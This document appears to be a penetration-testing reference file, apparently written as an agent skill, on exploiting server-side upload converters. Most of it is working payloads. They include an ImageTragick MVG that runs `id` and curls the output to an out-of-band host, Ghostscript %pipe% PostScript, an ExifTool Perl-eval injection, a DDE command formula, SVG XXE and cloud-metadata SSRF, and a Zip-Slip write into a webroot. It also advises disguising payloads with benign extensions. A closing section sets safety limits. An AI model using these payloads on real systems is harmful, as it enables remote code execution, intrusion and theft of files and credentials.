# Upload / converter / parser RCE — the CVE payloads

An upload is processed server-side by an image/PDF/document tool. The finding is a
reflected `id` (or `/etc/passwd` read back through the output/metadata), not "the
file was accepted". Fingerprint the tool + version first (error text, output
metadata, `identify`/`gs`/`exiftool` banners), then fire the matching CVE payload.
Deliver payloads with a benign extension/MIME (`filename=x.jpg;type=image/jpeg`) —
most pipelines route on content, not name.

## Contents
- ImageMagick / GraphicsMagick: ImageTragick CVE-2016-3714, PNG-profile file-read CVE-2022-44268
- Ghostscript: `%pipe%` command exec CVE-2023-36664 / CVE-2018-16509
- ExifTool — CVE-2021-22204 (DjVu Perl-eval RCE)
- LibreOffice / OnlyOffice (Office -> PDF conversion)
- SVG (rasterised by ImageMagick/rsvg/Inkscape/headless-Chrome)
- wkhtmltopdf / html-to-pdf without CDP
- Archive extraction (Zip-Slip / symlink -> file-write)
- Oracle / evidence
- Proof + safety

## ImageMagick / GraphicsMagick

### ImageTragick — CVE-2016-3714 (MVG/MSL delegate RCE + SSRF)
ImageMagick's delegates run shell for certain formats. An `.mvg`/`.svg`/`.msl` (or a
JPEG/PNG whose content is MVG) reaches `system()`:

```
# poc.mvg / rename to poc.jpg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://<oob>/x)'                     # SSRF probe
image over 0,0 0,0 '|/bin/sh -c "id > /tmp/o; curl https://<oob>/$(cat /tmp/o)"'   # RCE
pop graphic-context
```
Also `label:@/etc/passwd`, `text 0,0 '@/etc/passwd'`, and `msl:` scripts. If the
`url()` SSRF fires but delegates are patched, you still have an SSRF -> pivot.

### CVE-2022-44268 — arbitrary file read via PNG `profile` chunk
When ImageMagick `convert`/`identify` processes a crafted PNG referencing a local
file, it embeds that file's contents in the **output** PNG's `Raw profile type`
text chunk. Read it back with `identify -verbose out.png` or `exiftool out.png`.

- Craft a PNG whose `tEXt`/`iTXt` `profile` = `/etc/passwd` (public
  `CVE-2022-44268` PoC generators). Upload it to any feature that re-encodes the
  image and returns/serves the processed file.
- Then read `Raw profile type` from the returned image -> hex-decode -> `/etc/passwd`.
- Non-mutating file read = clean rung-1 proof.

## Ghostscript (PDF/EPS/PS rendering — anything that "renders PDF thumbnails")

### CVE-2023-36664 — `%pipe%` command execution via crafted filename/pipe
Ghostscript ≤ 10.01.2 mishandles a filename beginning with `|` or using the
`%pipe%` device -> command execution. Delivered via a PostScript/EPS/PDF:

```
%!PS
(%pipe%id > /tmp/gs)(w)file    /f exch def
```
or the device form (older CVE-2018-16509 / CVE-2019-14811 family):
```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

- Any EPS/PDF preview, PDF-to-image, or "PDF thumbnail" that shells to `gs` is a
  candidate. Upload the EPS; the pipe runs `id`.
- Confirm the version from `gs --version` in an error, or the pattern of failures.

## ExifTool — CVE-2021-22204 (DjVu Perl-eval RCE)

ExifTool ≤ 12.23 evals attacker-controlled DjVu annotation metadata as Perl. Any
feature that runs `exiftool` on an upload (avatars, attachments, "extract metadata",
avatar/image-processing pipelines) is vulnerable. Craft a file with a DjVu `(metadata
...)` block whose value injects Perl:

```
(metadata "\c${system('id')};")
```
Wrap it in an image ExifTool will parse (the public PoC builds a `.jpg`/`.djvu`
that triggers the DjVu code path regardless of extension). `id` runs as the
exiftool worker. This is a Critical-severity RCE — treat any `exiftool` fingerprint
as high-priority.

## LibreOffice / OnlyOffice (Office -> PDF conversion)

- Macro / DDE in ODT/DOC/XLSX: `=cmd|'/c calc'!A1` (DDE), or a document `Basic`
  macro run on open if macro security is misconfigured.
- `=WEBSERVICE("http://<oob>")` / `=HYPERLINK` for SSRF from spreadsheet conversion.
- Fingerprint via output PDF producer string `LibreOffice x.y`.

## SVG (rasterised by ImageMagick/rsvg/Inkscape/headless-Chrome)

```svg
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" height="100" width="100"/>
</svg>
```
```svg
<image xlink:href="file:///etc/passwd"/>       <!-- LFI-into-raster -->
```
Also XXE if the SVG is parsed as XML:
`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` -> `&xxe;`.

## wkhtmltopdf / html-to-pdf without CDP

`<iframe src="file:///etc/passwd"></iframe>` renders the file straight into the PDF;
`<img src="http://169.254.169.254/...">` is SSRF. No debug port needed. (Headless
Chrome pipelines -> `headless-chrome-cdp.md`.)

## Archive extraction (Zip-Slip / symlink -> file-write)

An archive whose entries use `../../../` paths (or symlinks) writes outside the
extraction dir -> file-write primitive -> RCE (`file-write-to-rce.md`). Craft a zip
with entry name `../../../../var/www/html/x.php`. Prove the write on a sentinel path
first.

## Oracle / evidence

- **Confirm:** `id`/`whoami` reflected via the RCE payload; `/etc/passwd` contents
  read back from the output image's metadata / rendered PDF; OOB hit from the
  `url()`/`xlink:href`/`WEBSERVICE` SSRF.
- **Negative control:** a plain benign upload converts normally; a fully-patched tool
  returns the processed file without the injected content.
- **Not a finding:** upload accepted but never processed server-side; the file is
  stored raw and only served (that's not converter RCE); a version banner with the
  vulnerable delegate/path disabled.

## Proof + safety

- Read `/etc/passwd` or reflect `id` — one representative proof, non-mutating.
- **Never** upload a webshell to a served path, a zip/parser bomb, or a payload
  that crashes a shared converter. If the only PoC is destructive (parser bomb),
  report on version + reachability or prove on UAT.
- **Scope the stop condition to the shape, not the status code.** A 500 with an error
  body is frequently the *positive* oracle (a converter naming its delegate, a parser
  echoing your payload, a type-resolution error) — capture the body and diff it against
  the benign baseline. The only 5xx you stop on is a **repeated worker-restart /
  retry-storm shape**, and you get there only by never sending a parser-bomb or DoS
  payload in the first place. See `../../deserialization-hunting/SKILL.md` — the same rule,
  same lane; the two must not give opposite instructions at the highest-frequency decision
  point.
- Flag any secret/file you read for handling; capture tool version + context.
